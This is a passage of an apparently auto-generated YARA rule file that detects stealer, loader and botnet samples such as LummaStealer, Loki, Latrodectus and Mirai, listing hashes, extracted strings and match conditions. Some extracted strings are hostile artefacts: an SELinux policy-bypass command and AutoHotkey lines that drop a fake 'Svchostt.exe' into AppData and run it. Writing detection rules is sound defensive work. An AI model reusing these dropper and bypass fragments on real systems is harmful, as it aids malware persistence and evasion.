      $x7 = "cd /boot;ausearch -c 'System.mod' --raw | audit2allow -M my-Systemmod;semodule -X 300 -i my-Systemmod.ppasn1: time did not seria" ascii /* score: '40.50'*/
      $x8 = "sync/atomic: store of inconsistently typed value into Valuesync: WaitGroup is reused before previous Wait has returnedtls: serve" ascii /* score: '38.00'*/
      $x9 = "/etc/profile.d/bash_cfgbad defer entry in panicbrotli: Writer is closedbypassed recovery failedcan't scan our own stackcertifica" ascii /* score: '37.00'*/
      $x10 = "  consultationcommunity ofthe nationalit should beparticipants align=\"leftthe greatestselection ofsupernaturaldependent onis me" ascii /* score: '35.00'*/
      $x11 = "http: putIdleConn: keep alives disabledinternal error: exit hook invoked panicinvalid HTTP header value for header %qinvalid ind" ascii /* score: '35.00'*/
      $x12 = "fmt: unknown base; can't happenframe_headers_prio_weight_shorthttp2: connection error: %v: %vinternal error - misuse of itabinva" ascii /* score: '34.50'*/
      $s13 = "os.(*ProcessState).Sys" fullword ascii /* score: '30.00'*/
      $s14 = "http: putIdleConn: CloseIdleConnections was calledhttp: suspiciously long trailer after chunked bodymallocgc called with gcphase" ascii /* score: '30.00'*/
      $s15 = "os/exec.(*ExitError).Sys" fullword ascii /* score: '30.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 17000KB and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _HijackLoader_signature__d7e2fd259780271687ffca462b9e69b7_imphash__HijackLoader_signature__d7e2fd259780271687ffca462b9e69b7__2 {
   meta:
      description = "_subset_batch - from files HijackLoader(signature)_d7e2fd259780271687ffca462b9e69b7(imphash).exe, HijackLoader(signature)_d7e2fd259780271687ffca462b9e69b7(imphash)_d81b31fe.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "867dc1941f2a8cd1a1e47005768e6ec213d6bafb22c5614e3af5a7252848a2ff"
      hash2 = "d81b31fea5a084ae8d10593dcb613452e45dffb05378294b71cf22086fe49ca0"
   strings:
      $x1 = "<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\"><assemblyIdentity name=\"setup.exe\" version=\"1.0." ascii /* score: '48.00'*/
      $s2 = "entAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitectur" ascii /* score: '26.00'*/
      $s3 = "as-microsoft-com:asm.v3\"><security><requestedPrivileges><requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"></reque" ascii /* score: '26.00'*/
      $s4 = "C:\\agent\\_work\\8\\s\\build\\ship\\x86\\burn.pdb" fullword ascii /* score: '25.00'*/
      $s5 = "Failed to get module handle to process." fullword ascii /* score: '23.00'*/
      $s6 = "Failed to get path to bundle source process path to layout." fullword ascii /* score: '23.00'*/
      $s7 = "pMsi.dll" fullword wide /* score: '23.00'*/
      $s8 = "stipendiary.exe" fullword wide /* score: '22.00'*/
      $s9 = "Failed to open handle to engine process path." fullword ascii /* score: '18.00'*/
      $s10 = "Failed to create embedded process at path: %ls" fullword ascii /* score: '18.00'*/
      $s11 = "<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\"><assemblyIdentity name=\"setup.exe\" version=\"1.0." ascii /* score: '18.00'*/
      $s12 = "Failed to append the file handle to the command line." fullword ascii /* score: '15.00'*/
      $s13 = "Failed to append original command line." fullword ascii /* score: '15.00'*/
      $s14 = ".burn.elevated" fullword wide /* score: '13.00'*/
      $s15 = "Failed to get windows path for working folder." fullword ascii /* score: '12.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 13000KB and pe.imphash() == "d7e2fd259780271687ffca462b9e69b7" and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _Joker_signature__463c620f_Joker_signature__be92b652_3 {
   meta:
      description = "_subset_batch - from files Joker(signature)_463c620f.xapk, Joker(signature)_be92b652.xapk"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "463c620fae61048111349d81b0a3625c33fec06a889006ce38dd1e3750f41481"
      hash2 = "be92b652d0579df969629124ea4afd5b1d3d7b0f15316cab2541c0821456a864"
   strings:
      $s1 = "META-INF/androidx.lifecycle_lifecycle-process.versionPK" fullword ascii /* score: '18.00'*/
      $s2 = "META-INF/androidx.lifecycle_lifecycle-process.version" fullword ascii /* score: '18.00'*/
      $s3 = "Fazer login com o Google" fullword ascii /* score: '18.00'*/
      $s4 = "META-INF/androidx.compose.runtime_runtime.version" fullword ascii /* score: '17.00'*/
      $s5 = "META-INF/androidx.compose.runtime_runtime-saveable.version" fullword ascii /* score: '17.00'*/
      $s6 = "META-INF/androidx.compose.runtime_runtime.versionPK" fullword ascii /* score: '17.00'*/
      $s7 = "META-INF/androidx.compose.runtime_runtime-saveable.versionPK" fullword ascii /* score: '17.00'*/
      $s8 = "Vyskakovac" fullword ascii /* base64 encoded string 'W+$jJ/i' */ /* score: '16.00'*/
      $s9 = "META-INF/androidx.loader_loader.version" fullword ascii /* score: '16.00'*/
      $s10 = "res/drawable/$cleaner_loader_image__0.xml" fullword ascii /* score: '16.00'*/
      $s11 = "res/drawable/cleaner_loader_image.xml}" fullword ascii /* score: '16.00'*/
      $s12 = "Installeer" fullword ascii /* base64 encoded string '"{-jY^z' */ /* score: '16.00'*/
      $s13 = "))res/drawable/$cleaner_loader_image__0.xml" fullword ascii /* score: '16.00'*/
      $s14 = "%%res/drawable/cleaner_loader_image.xml" fullword ascii /* score: '16.00'*/
      $s15 = "META-INF/androidx.loader_loader.versionPK" fullword ascii /* score: '16.00'*/
   condition:
      ( uint16(0) == 0x4b50 and filesize < 28000KB and ( 8 of them )
      ) or ( all of them )
}

rule _MetaStealer_signature__17b3f2dd_MetaStealer_signature__81e0f8ea_4 {
   meta:
      description = "_subset_batch - from files MetaStealer(signature)_17b3f2dd.cab, MetaStealer(signature)_81e0f8ea.msi"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "17b3f2dddbdacfb534cabf7bdaa47d2266cba1f95b1f7436c5af48a911469641"
      hash2 = "81e0f8ea01563bac4e38392a51b2c5b4b233c11b3b28ef7a5c595c7e6f27640d"
   strings:
      $s1 = "sw.exe" fullword ascii /* score: '16.00'*/
      $s2 = "/pxO>k" fullword ascii /* reversed goodware string 'k>Oxp/' */ /* score: '11.00'*/
      $s3 = "\"fflE:\"" fullword ascii /* score: '10.00'*/
      $s4 = "~\\`]'&21" fullword ascii /* score: '9.00'*/ /* hex encoded string '!' */
      $s5 = "* 7GU:<[" fullword ascii /* score: '9.00'*/
      $s6 = "*#* h+" fullword ascii /* score: '9.00'*/
      $s7 = "Kc- /c" fullword ascii /* score: '9.00'*/
      $s8 = "wwwwwwwwwwwwwwwwrw" fullword ascii /* score: '8.00'*/
      $s9 = "wwwwwwwwwqwwwwwwwwwwwwwwpwf" fullword ascii /* score: '8.00'*/
      $s10 = "wwwwwwwwwwwwwwwwwwwwwwpw" fullword ascii /* score: '8.00'*/
      $s11 = "wwwwwwwwwqwwwwwwwwwwwwww" fullword ascii /* score: '8.00'*/
      $s12 = "wwwwwwwwwwwwwwwwvw" fullword ascii /* score: '8.00'*/
   condition:
      ( ( uint16(0) == 0x534d or uint16(0) == 0xcfd0 ) and filesize < 17000KB and ( 8 of them )
      ) or ( all of them )
}

rule _GuLoader_signature__240a7285_GuLoader_signature__7fc90eb8_MassLogger_signature__5 {
   meta:
      description = "_subset_batch - from files GuLoader(signature)_240a7285.js, GuLoader(signature)_7fc90eb8.js, MassLogger(signature).js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "240a7285ec863a3a667337350780ddc40b24edbed195b9a418c6b13ebcb44f7a"
      hash2 = "7fc90eb85088cc5b5d2e1046bec4c53e1bb07c746c2e32582feabd595884f38e"
      hash3 = "77e1787b6b3d7a3254c4acac3e2d996b9b629ca1c76222c6ad627d4a5880c35c"
   strings:
      $s1 = "//Undumped stedtillggene, acholia! terras!" fullword ascii /* score: '18.00'*/
      $s2 = "//Monosyllogism. execeptional, skidtfisket outshouting; delocalizing" fullword ascii /* score: '16.00'*/
      $s3 = "//Ekstemporalspillets: udspyendes jobtilbud sukkerroer" fullword ascii /* score: '16.00'*/
      $s4 = "//Natty glemmeprocessernes stenocoriasis!" fullword ascii /* score: '15.00'*/
      $s5 = "//Contravindication systempartner ringetoner adherent." fullword ascii /* score: '15.00'*/
      $s6 = "var Natriumbenzoat = \"Apologizers blussenes:\";" fullword ascii /* score: '15.00'*/
      $s7 = "var Rinas = \"Bountihead: halters:\";" fullword ascii /* score: '15.00'*/
      $s8 = "//Agentromanens accountantship; kardinalsystemer182" fullword ascii /* score: '15.00'*/
      $s9 = "//prexes bundlerooted verdensprocessen!" fullword ascii /* score: '15.00'*/
      $s10 = "//Preprocessorers uvula124 overlssendes" fullword ascii /* score: '15.00'*/
      $s11 = "//Processionerne? raakostsalaternes patjfen! sintret. susanna," fullword ascii /* score: '15.00'*/
      $s12 = "//Spaltningsprocessen krukkende" fullword ascii /* score: '15.00'*/
      $s13 = "//Circumscriptly73 nedstyrtningerne" fullword ascii /* score: '15.00'*/
      $s14 = "//Friturestegningen, harstrong: genfortl. interprocessor: infanterierne." fullword ascii /* score: '15.00'*/
      $s15 = "//Paralyses! municipalize omredaktion eddaerne fordjelsesprocesses?" fullword ascii /* score: '15.00'*/
   condition:
      ( uint16(0) == 0x0a0d and filesize < 900KB and ( 8 of them )
      ) or ( all of them )
}

rule _Loki_signature__356f908c1b0cd139f4a1e44528f97d0c_imphash__Loki_signature__356f908c1b0cd139f4a1e44528f97d0c_imphash__1bc87c4_6 {
   meta:
      description = "_subset_batch - from files Loki(signature)_356f908c1b0cd139f4a1e44528f97d0c(imphash).exe, Loki(signature)_356f908c1b0cd139f4a1e44528f97d0c(imphash)_1bc87c4f.exe, Loki(signature)_356f908c1b0cd139f4a1e44528f97d0c(imphash)_b812cdb8.exe, Loki(signature)_356f908c1b0cd139f4a1e44528f97d0c(imphash)_dc09d93c.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "cb90ff94822154b2ec1bc9e9fd11bd64bcb77c84896bc01e3952e44f45ec75e3"
      hash2 = "1bc87c4f205cd112b2cec3f67c577ae7b604ed56c6cd6a15d8ad1ae6438598b8"
      hash3 = "b812cdb8e88e818a206ac067adbc9017ea3dcedb19544493858247a0cfa591dc"
      hash4 = "dc09d93c6815646ab07908d02c810efd668179f2fb43237c588657171f06a762"
   strings:
      $x1 = "9kTQ0BfSjUTbW+tJUxC78+gISjG5OVTil9iG862iqp3ZTbjSOXMta8h0ednnQvIsfAqrgfqiOrMQuR8q+TXAe8xYsCwGClsQHFKMWD1XSorMWLAsBgpbEBxSjFg9V0qK" ascii /* score: '51.00'*/
      $x2 = "Run C:\\Users\\%A_UserName%\\AppData\\Local\\Svchostt-t.exe" fullword ascii /* score: '50.00'*/
      $x3 = "Run C:\\Users\\%A_UserName%\\AppData\\Local\\Svchostt.exe" fullword ascii /* score: '50.00'*/
      $x4 = "<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\" xmlns:v3=\"urn:schemas-microsoft-com:asm.v3\"><asse" ascii /* score: '48.00'*/
      $x5 = "FileInstall, Svchostt-t.txt, C:\\Users\\%A_UserName%\\AppData\\Local\\Svchostt-t.exe, 1" fullword ascii /* score: '43.00'*/
      $x6 = "FileInstall, MC, C:\\Users\\%A_UserName%\\AppData\\Local\\MCconfig.dll, 1" fullword ascii /* score: '43.00'*/
      $x7 = "FileMove, C:\\Users\\%A_UserName%\\AppData\\Local\\Svchost.Text, C:\\Users\\%A_UserName%\\AppData\\Local\\Svchostt.exe , 1" fullword ascii /* score: '43.00'*/
      $x8 = "Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"*\" publicKeyToken=\"6595b64144ccf1df\" language" ascii /* score: '39.00'*/
      $x9 = "FileInstall, XML, C:\\Users\\%A_UserName%\\AppData\\Local\\XML.txt, 1" fullword ascii /* score: '38.00'*/
      $x10 = "FileInstall, wawa, C:\\Users\\%A_UserName%\\AppData\\Local\\WindowsCodecsRaw.txt, 1" fullword ascii /* score: '38.00'*/
      $x11 = "c:\\users\\horus\\documents\\visual studio 2017\\Projects\\MCconfig-1\\MCconfig-1\\obj\\Debug\\Mcconfig.pdb" fullword ascii /* score: '36.00'*/
      $x12 = "FileInstall, Svchost.Text, C:\\Users\\%A_UserName%\\AppData\\Local\\Svchost.Text, 1" fullword ascii /* score: '36.00'*/
      $x13 = "C:\\Users\\HORUS\\Documents\\Visual Studio 2017\\Projects\\HStrtup-1\\HStrtup-1\\obj\\Debug\\HStrtup-2.pdb" fullword ascii /* score: '33.00'*/
      $x14 = "C:\\Users\\HORUS\\Documents\\Visual Studio 2017\\Projects\\Main\\Main\\obj\\Debug\\Main-RNP-2.pdb" fullword ascii /* score: '33.00'*/
      $s15 = "lSystem.Resources.ResourceReader, mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.R" ascii /* score: '27.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 4000KB and pe.imphash() == "c802d5dad8b7cdfc500d0fe25d85a9cf" and ( 1 of ($x*) )
      ) or ( all of them )
}

rule _Latrodectus_signature__Latrodectus_signature__32f88614_7 {
   meta:
      description = "_subset_batch - from files Latrodectus(signature).msi, Latrodectus(signature)_32f88614.msi"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "88e9c1f5026834ebcdaed98f56d52b5f23547ac2c03aa43c5e50e7d8e1b82b3a"
      hash2 = "32f886142de76f09b1e7229a79e66eb46889251ebf871e4df3b6de7fd5cef749"
   strings:
      $x1 = "(This operation cannot be undone.)Error writing to file: [2].  Verify that you have access to that directory.Installer stopped p" ascii /* score: '81.00'*/
      $x2 = "[2]Error converting file time to local time for file: [3]. GetLastError: [2].Path: [2] is not a parent of [3].On the dialog [2] " ascii /* score: '72.00'*/
      $x3 = "DataUploader.dll" fullword wide /* score: '34.00'*/
      $x4 = "Your original Firewall configuration will be restored.Invalid Firewall network scope: [2].There was an error registering port wi" ascii /* score: '34.00'*/
      $x5 = "C:\\JobRelease\\win\\Release\\custact\\x86\\DataUploader.pdb" fullword ascii /* score: '33.00'*/
      $x6 = "%s\\System32\\cmd.exe" fullword wide /* score: '32.00'*/
      $x7 = "[SystemFolder]msiexec.exe" fullword wide /* score: '32.00'*/
      $s8 = "Unsupported command file format. The supported file formats are: ANSI, UTF-8, Unicode Little Endian and Unicode Big Endian. The " wide /* score: '30.00'*/
      $s9 = "ze cabinet file server. The required file 'CABINET.DLL' may be missing.Database: [2]. Insufficient parameters for Execute.Databa" ascii /* score: '29.00'*/
      $s10 = " was an error during the SQL script execution process.ODBC Error: [2] ([3]).SQL script parse error: invalid syntax.Internal erro" ascii /* score: '29.00'*/
      $s11 = "e control [3] on the dialog [2].Creating the [2] table failed.Creating a cursor to the [2] table failed.Executing the [2] view f" ascii /* score: '28.00'*/
      $s12 = "WShell32.dll" fullword wide /* score: '28.00'*/
      $s13 = "C:\\JobRelease\\custact\\datauploader\\src\\DataUploader.cpp" fullword wide /* score: '27.00'*/
      $s14 = "figured properly and try the install again.Executing action [2] failed.User '[2]' has previously initiated an install for produc" ascii /* score: '26.00'*/
      $s15 = "] script error [3], [4]: [5] Line [6], Column [7], [8].Could not execute custom action [2], location: [3], command: [4].Transfor" ascii /* score: '26.00'*/
   condition:
      ( uint16(0) == 0xcfd0 and filesize < 8000KB and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _HijackLoader_signature__d8b31f8c03e0c76ff245ed05a15ffe6c_imphash__LummaStealer_signature__1aae8bf580c846f39c71c05898e57e88__8 {
   meta:
      description = "_subset_batch - from files HijackLoader(signature)_d8b31f8c03e0c76ff245ed05a15ffe6c(imphash).exe, LummaStealer(signature)_1aae8bf580c846f39c71c05898e57e88(imphash).exe, LummaStealer(signature)_1aae8bf580c846f39c71c05898e57e88(imphash)_179bdf50.exe, LummaStealer(signature)_1aae8bf580c846f39c71c05898e57e88(imphash)_3c2ef69a.exe, LummaStealer(signature)_1aae8bf580c846f39c71c05898e57e88(imphash)_7935d548.exe, LummaStealer(signature)_1aae8bf580c846f39c71c05898e57e88(imphash)_9e4a0b96.exe, LummaStealer(signature)_1aae8bf580c846f39c71c05898e57e88(imphash)_a7270dd3.exe, LummaStealer(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "aa59b9a8c2a1121e10d0bf939fc255b2ddd213fce8b1bba3c8ef84632be02aa3"
      hash2 = "8ad7cbc9e16fe872a2296b32cdcc52744969b90fb400abcec7ab24a853c2f36b"
      hash3 = "179bdf50eba7b0927eae4104945cd4e5fe66ef77d89f9a693cadb13fa78e6ab5"
      hash4 = "3c2ef69aea6cb66957fb694c4aec987b9df428698be5336b3ac4b4acdbe122b6"
      hash5 = "7935d54819db8a8e3a92ad06a95496a1884d368d27e3af2bc4e7ba3e2e49c952"
      hash6 = "9e4a0b96a349285d56db12ff601ef94e16da03c5a71460995d218e4a84b17c63"
      hash7 = "a7270dd368ccee242cdfcc13b7b4993d3eee78ab3981e04b96ba2d2e33f8eb3b"
      hash8 = "16db153e6a6d2c5fa1a2899929163feebe3d29d61fb22c9cdae06cb916fc6eb4"
   strings:
      $x1 = "span set block with unpopped elements found in resetruntime: GetQueuedCompletionStatusEx failed (errno= runtime: NtCreateWaitCom" ascii /* score: '38.00'*/
      $s2 = "runtime.mutexWaitListHead" fullword ascii /* score: '26.00'*/
      $s3 = "runtime.mutexSampleContention" fullword ascii /* score: '26.00'*/
      $s4 = "      <dpiAware xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">true/pm</dpiAware> <!-- legacy -->" fullword ascii /* score: '25.00'*/
      $s5 = " (types from different scopes)notetsleep - waitm out of syncfailed to get system page sizeruntime: found in object at *( in prep" ascii /* score: '23.00'*/
      $s6 = " (types from different scopes)notetsleep - waitm out of syncfailed to get system page sizeruntime: found in object at *( in prep" ascii /* score: '23.00'*/
      $s7 = "runtime.mutexPreferLowLatency" fullword ascii /* score: '21.00'*/
      $s8 = "updateMaxProcsGoroutine: phase errorruntime: bad notifyList size - sync=accessed data from freed user arena runtime: wrong gorou" ascii /* score: '21.00'*/
      $s9 = "runtime.processorVersionInfo" fullword ascii /* score: '21.00'*/
      $s10 = "runtime.mutexprofilerate" fullword ascii /* score: '21.00'*/
      $s11 = "runtime.stackPoisonCopy" fullword ascii /* score: '20.00'*/
      $s12 = "runtime.dumpStacksRec" fullword ascii /* score: '20.00'*/
      $s13 = " s.sweepgen= allocCount page summaryProcessPrng" fullword ascii /* score: '20.00'*/
      $s14 = "runtime.dumpTypesRec" fullword ascii /* score: '20.00'*/
      $s15 = "runtime.execLock" fullword ascii /* score: '19.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 10000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _Mirai_signature__00b0c7f7_Mirai_signature__0f59dd6a_Mirai_signature__119c68b9_9 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_00b0c7f7.elf, Mirai(signature)_0f59dd6a.elf, Mirai(signature)_119c68b9.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "00b0c7f7079f032382170b8b1b18cbdd6697e546f2a9bcb9be7953f1b495dc13"
      hash2 = "0f59dd6a59ffc2423ae6226384059040cf0b1276b6c96fe913517caa9f809fc3"
      hash3 = "119c68b9ae690f0ab2f503b50b250b4a6215e108be5f6fb6df2ed4efeef11695"
   strings:
      $s1 = "e != EDEADLK || (kind != PTHREAD_MUTEX_ERRORCHECK_NP && kind != PTHREAD_MUTEX_RECURSIVE_NP)" fullword ascii /* score: '24.00'*/
      $s2 = "__pthread_mutex_unlock_usercnt" fullword ascii /* score: '21.00'*/
      $s3 = "PTHREAD_MUTEX_TYPE (mutex) == PTHREAD_MUTEX_ERRORCHECK_NP" fullword ascii /* score: '21.00'*/
      $s4 = "type == PTHREAD_MUTEX_ERRORCHECK_NP" fullword ascii /* score: '21.00'*/
      $s5 = "glibc.pthread.mutex_spin_count" fullword ascii /* score: '21.00'*/
      $s6 = "relocation processing: %s%s" fullword ascii /* score: '18.00'*/
      $s7 = "__pthread_mutex_unlock_full" fullword ascii /* score: '18.00'*/
      $s8 = "pthread_mutex_lock.o" fullword ascii /* score: '18.00'*/
      $s9 = "___pthread_mutex_unlock" fullword ascii /* score: '18.00'*/
      $s10 = "___pthread_mutex_lock" fullword ascii /* score: '18.00'*/
      $s11 = "pthread_mutex_conf.o" fullword ascii /* score: '18.00'*/
      $s12 = "pthread_mutex_unlock.o" fullword ascii /* score: '18.00'*/
      $s13 = "__pthread_mutex_lock_full" fullword ascii /* score: '18.00'*/
      $s14 = "pthread_mutex_unlock.c" fullword ascii /* score: '18.00'*/
      $s15 = "EHWPOISON" fullword ascii /* score: '16.50'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 3000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Latrodectus_signature__339361f405a0d1100aa84614758ab758_imphash__Latrodectus_signature__339361f405a0d1100aa84614758ab758_im_10 {
   meta:
      description = "_subset_batch - from files Latrodectus(signature)_339361f405a0d1100aa84614758ab758(imphash).exe, Latrodectus(signature)_339361f405a0d1100aa84614758ab758(imphash)_16474e9e.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "2fe0bd27009fc17f5150257cf84a74429005f101744ca20a4ad599ed6e6869c1"
      hash2 = "16474e9e4773fbc1e0b48a5025fad31b7f084b1beffb9a42687b4d01979885fe"
   strings:
      $s1 = "e:\\jenkins_source_v2\\workspace\\UPDT_TRUNK\\label\\WIN64_VC6_VC8\\updt_src\\trunk\\update\\build\\win\\bin\\x64\\release\\bkdr" ascii /* score: '25.00'*/
      $s2 = "c:\\logs\\bkupcft.log" fullword wide /* score: '25.00'*/
      $s3 = "c:\\logs\\qhdebug.log" fullword wide /* score: '25.00'*/
      $s4 = "c:\\logs\\qhlog.log" fullword wide /* score: '25.00'*/
      $s5 = "c:\\logs\\bkdrupdt.log" fullword wide /* score: '25.00'*/
      $s6 = "bkdrupdt.dll" fullword wide /* score: '23.00'*/
      $s7 = "infori.dll" fullword wide /* score: '23.00'*/
      $s8 = "qhrscan.exe" fullword wide /* score: '23.00'*/
      $s9 = "incupdt.dll" fullword wide /* score: '23.00'*/
      $s10 = "eecore.dll" fullword wide /* score: '23.00'*/
      $s11 = "c:\\logs\\updt.ini" fullword wide /* score: '21.00'*/
      $s12 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\Scanner.exe" fullword ascii /* score: '19.00'*/
      $s13 = "logs\\bkupcft.log" fullword wide /* score: '16.00'*/
      $s14 = "Global\\MRS_FILE_MUTEX" fullword ascii /* score: '15.00'*/
      $s15 = "Client version - [Major : %lu] [Minor : %lu] >> Server version - [Major : %lu] [Minor : %lu]" fullword wide /* score: '15.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 6000KB and pe.imphash() == "339361f405a0d1100aa84614758ab758" and ( 8 of them )
      ) or ( all of them )
}

rule _HijackLoader_signature__d8b31f8c03e0c76ff245ed05a15ffe6c_imphash__Kaiji_signature__Kaiji_signature__78e6c917_Kaiji_signatur_11 {
   meta:
      description = "_subset_batch - from files HijackLoader(signature)_d8b31f8c03e0c76ff245ed05a15ffe6c(imphash).exe, Kaiji(signature).elf, Kaiji(signature)_78e6c917.elf, Kaiji(signature)_7cab2814.elf, Kaiji(signature)_8895157c.elf, Kaiji(signature)_a82036bb.elf, Kaiji(signature)_af3c1821.elf, Kaiji(signature)_bd7a37a8.elf, Kaiji(signature)_c6c0da6a.elf, Kaiji(signature)_ded5e440.elf, Kaiji(signature)_eec9b44f.elf, LummaStealer(signature)_1aae8bf580c846f39c71c05898e57e88(imphash).exe, LummaStealer(signature)_1aae8bf580c846f39c71c05898e57e88(imphash)_179bdf50.exe, LummaStealer(signature)_1aae8bf580c846f39c71c05898e57e88(imphash)_3c2ef69a.exe, LummaStealer(signature)_1aae8bf580c846f39c71c05898e57e88(imphash)_7935d548.exe, LummaStealer(signature)_1aae8bf580c846f39c71c05898e57e88(imphash)_9e4a0b96.exe, LummaStealer(signature)_1aae8bf580c846f39c71c05898e57e88(imphash)_a7270dd3.exe, LummaStealer(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "aa59b9a8c2a1121e10d0bf939fc255b2ddd213fce8b1bba3c8ef84632be02aa3"
      hash2 = "aead4ac6bea6859316dce9aeda0d704e05293466dde897247c7c32cb32c6a4e1"
      hash3 = "78e6c917b26061148d6a1f589521c9a91cb3c35d7263b046bbbfb08e7ad43c34"
      hash4 = "7cab2814a06c64a3cacd86d90222f469c67a4c9ff927c8fc0b262f8a667b2992"
      hash5 = "8895157c86f0f62ccc96c12ca064bb7cc1d311cbe94467fbe9895f3aa74b5f43"
      hash6 = "a82036bbe31274fd6c010f76f210d3c81dfbc47eb36843a9ce5e5ea50a6cd29f"
      hash7 = "af3c182144f6ec184bbae0429ffe5d29767cd82cec0410faf6fa3068b4551afb"
      hash8 = "bd7a37a86a1fa6831f426d1570f702aaffe454b4609eda5f111b7bd0f4d6da81"
      hash9 = "c6c0da6a5a6c95627c240816ab46ccf88b5e661c59827c33e9af6ef4080855d8"
      hash10 = "ded5e44044fbffebe6a1beb9d66f8c9282cbf7cef065d8231244997f0829a84e"
      hash11 = "eec9b44f6de1f6157457edc8da37f9813a75b3176c61f89b7aa78dcdf7890892"
      hash12 = "8ad7cbc9e16fe872a2296b32cdcc52744969b90fb400abcec7ab24a853c2f36b"
      hash13 = "179bdf50eba7b0927eae4104945cd4e5fe66ef77d89f9a693cadb13fa78e6ab5"
      hash14 = "3c2ef69aea6cb66957fb694c4aec987b9df428698be5336b3ac4b4acdbe122b6"
      hash15 = "7935d54819db8a8e3a92ad06a95496a1884d368d27e3af2bc4e7ba3e2e49c952"
      hash16 = "9e4a0b96a349285d56db12ff601ef94e16da03c5a71460995d218e4a84b17c63"
      hash17 = "a7270dd368ccee242cdfcc13b7b4993d3eee78ab3981e04b96ba2d2e33f8eb3b"
      hash18 = "16db153e6a6d2c5fa1a2899929163feebe3d29d61fb22c9cdae06cb916fc6eb4"
   strings:
      $s1 = "runtime.getempty" fullword ascii /* score: '22.00'*/
      $s2 = "runtime.getempty.func1" fullword ascii /* score: '22.00'*/
      $s3 = "runtime.waitReason.isMutexWait" fullword ascii /* score: '21.00'*/
      $s4 = "runtime.execute" fullword ascii /* score: '21.00'*/
      $s5 = "runtime.tracebackHexdump" fullword ascii /* score: '20.00'*/
      $s6 = "runtime.gcDumpObject" fullword ascii /* score: '20.00'*/
      $s7 = "runtime.tracebackHexdump.func1" fullword ascii /* score: '20.00'*/
      $s8 = "runtime.hexdumpWords" fullword ascii /* score: '20.00'*/
      $s9 = "runtime.injectglist.func1" fullword ascii /* score: '20.00'*/
      $s10 = "runtime.injectglist" fullword ascii /* score: '20.00'*/
      $s11 = "runtime.dumpregs" fullword ascii /* score: '20.00'*/
      $s12 = "runtime.dumpgstatus" fullword ascii /* score: '20.00'*/
      $s13 = "*runtime.mutex" fullword ascii /* score: '18.00'*/
      $s14 = "runtime.envKeyEqual" fullword ascii /* score: '18.00'*/
      $s15 = "runtime.(*rwmutex).runlock" fullword ascii /* score: '18.00'*/
   condition:
      ( ( uint16(0) == 0x5a4d or uint16(0) == 0x457f ) and filesize < 17000KB and ( 8 of them )
      ) or ( all of them )
}

rule _LummaStealer_signature__1aae8bf580c846f39c71c05898e57e88_imphash__LummaStealer_signature__1aae8bf580c846f39c71c05898e57e88__12 {
   meta:
      description = "_subset_batch - from files LummaStealer(signature)_1aae8bf580c846f39c71c05898e57e88(imphash).exe, LummaStealer(signature)_1aae8bf580c846f39c71c05898e57e88(imphash)_179bdf50.exe, LummaStealer(signature)_1aae8bf580c846f39c71c05898e57e88(imphash)_3c2ef69a.exe, LummaStealer(signature)_1aae8bf580c846f39c71c05898e57e88(imphash)_7935d548.exe, LummaStealer(signature)_1aae8bf580c846f39c71c05898e57e88(imphash)_9e4a0b96.exe, LummaStealer(signature)_1aae8bf580c846f39c71c05898e57e88(imphash)_a7270dd3.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "8ad7cbc9e16fe872a2296b32cdcc52744969b90fb400abcec7ab24a853c2f36b"
      hash2 = "179bdf50eba7b0927eae4104945cd4e5fe66ef77d89f9a693cadb13fa78e6ab5"
      hash3 = "3c2ef69aea6cb66957fb694c4aec987b9df428698be5336b3ac4b4acdbe122b6"
      hash4 = "7935d54819db8a8e3a92ad06a95496a1884d368d27e3af2bc4e7ba3e2e49c952"
      hash5 = "9e4a0b96a349285d56db12ff601ef94e16da03c5a71460995d218e4a84b17c63"
      hash6 = "a7270dd368ccee242cdfcc13b7b4993d3eee78ab3981e04b96ba2d2e33f8eb3b"
   strings:
      $x1 = "pacer: assist ratio=workbuf is not emptybad use of bucket.mpbad use of bucket.bpruntime: double waitpreempt off reason: forcegc:" ascii /* score: '56.00'*/
      $x2 = " runqueue= stopwait= runqsize= gfreecnt= throwing= spinning=atomicand8float64nanfloat32nanException  ptrSize=  targetpc= until p" ascii /* score: '54.00'*/
      $x3 = "runtime: waitforsingleobject unexpected; result=CreateWaitableTimerEx when creating timer failedruntime.preemptM: duplicatehandl" ascii /* score: '53.00'*/
